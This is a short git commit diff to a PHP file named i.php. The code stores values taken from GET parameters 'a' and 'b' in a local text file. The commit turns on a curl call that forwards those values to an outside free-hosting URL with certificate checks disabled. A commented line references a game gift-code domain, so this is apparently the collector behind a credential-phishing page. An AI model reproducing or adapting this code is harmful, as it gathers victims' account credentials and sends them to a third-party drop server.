90394369deeb4df762cb54e9fe7b03319e7ff21a
T <80206409+yourworld03@users.noreply.github.com>
2022-04-10 17:41:42 +0700

    Update i.php

--- i.php
+++ i.php
@@ -3,13 +3,13 @@
     $b = $_GET["b"];
 	$myfile = file_put_contents('yu@a@.txt', $a."|".$b.PHP_EOL , FILE_APPEND | LOCK_EX);
     //echo "https://giftcode-lienquan.tk/check/5431/cook.php?a=$a&b=$b";
-    /*$c = curl_init();
-	curl_setopt($c, CURLOPT_URL, "https://giftcode-lienquan.tk/check/5431/cook.php?a=$a&b=$b");
+    $c = curl_init();
+	curl_setopt($c, CURLOPT_URL, "https://151adav.000webhostapp.com/a.php?a=$a&b=$b");
 	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
 	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
 	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
 	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
 	$rq1 = curl_exec($c);
 	curl_close($c);
-	echo $rq1;*/
+	echo $rq1;
 ?>
